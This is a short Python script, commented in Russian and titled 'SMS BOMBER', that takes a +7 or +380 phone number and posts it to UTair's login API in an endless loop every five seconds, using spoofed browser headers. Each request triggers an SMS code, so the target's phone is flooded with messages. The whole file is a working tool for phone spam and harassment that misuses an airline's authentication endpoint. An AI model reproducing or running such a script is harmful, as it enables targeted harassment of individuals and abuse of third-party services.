import requests # Загружаем библоитеку requests 
import time # Загружаем библиоетку time

print("Это  SMS BOMBER\n\nНомер телефона, должен начинатся так: +7 или +380\n\n") #Выводим в консоль текст. 

phone = input("Номер: ") #Номер мобильного телефона на который хотите направить спам.

phone = str(phone)

if (phone[0:2] == "+7" and len(phone[1:]) == 11) or (phone[0:4] == "+380" and len(phone[1:]) == 12): #Делаем проверку, сколько цифр и правильно ли в начале. 
  while True: # Делаем бескоенчный цикл. 
    cl = requests.session()
    cl.get('https://b.utair.ru/api/v1/login/')
    rSL = requests.post('https://b.utair.ru/api/v1/login/', headers = {"Content-Type":"application/json", "Referer":"https://www.utair.ru/", "Sec-Fetch-Mode":"cors", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"}, json={"login":phone[1:]}) # Отпраялем запрос.
    if rSL.status_code == 200: # Делаем проверку на результат. 
      print("Сообщение от сервиса utAir отправлено.") # Если результат выполнен
    else: # Если проверка не пройдена
      print("Сообщение от сервиса utAir не отправлено.")
    time.sleep(5) # Задержка
else:
    print("Номер телефона набран не правильно, повторите попытку")